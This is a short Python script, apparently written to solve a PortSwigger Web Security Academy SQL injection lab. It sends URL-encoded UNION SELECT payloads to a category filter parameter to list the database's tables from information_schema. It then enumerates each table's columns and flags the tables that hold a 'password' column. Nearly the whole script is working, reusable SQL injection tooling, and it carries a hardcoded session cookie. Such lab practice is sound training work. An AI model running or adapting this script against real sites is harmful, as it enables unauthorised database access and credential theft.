#!/bin/python
import requests
import re
from bs4 import BeautifulSoup

headers = { 
  "Host" : "acf11f591e0abcefc098335d00360058.web-security-academy.net", #Change this
  "Cookie" : "session=SZ1gyIzPRP6fMbpQdEgLhg92HzfyucLJ"	#change this
}

base_url = "https://acf11f591e0abcefc098335d00360058.web-security-academy.net" #change this

response = requests.get(f"{base_url}/filter?category=%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%54%41%42%4c%45%5f%4e%41%4d%45%2c%4e%55%4c%4c%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%2d%2d", headers=headers)

soup = BeautifulSoup(response.content, 'html.parser')

tables_names = []

match_tables = []

db_tables_names = soup.find("table", { "class" : "is-table-longdescription" })

for row in db_tables_names.findAll("tr"):
  table_name = row.find("th").getText()
  tables_names.append(table_name)
  #print(table_name)
  
for table in tables_names:
  payload = f"'+UNION+SELECT+COLUMN_NAME,NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'{table}'--"
  page = requests.get(
  	f"{base_url}/filter?category={payload}", 
  	headers=headers)
  print(f"---------------testing table {table}--------------------")
  soup2 = BeautifulSoup(page.content, 'html.parser')
  if soup2(text=re.compile('password')):
    print(f"FOUND ON: {table}!!!!!!!!!!!!!!!!!!!!!!!!!")
    match_tables.append(table)
   
print(
  '''
  The word "password" was found on the following tables:

  '''
)

for item in match_tables:
  print(item)
    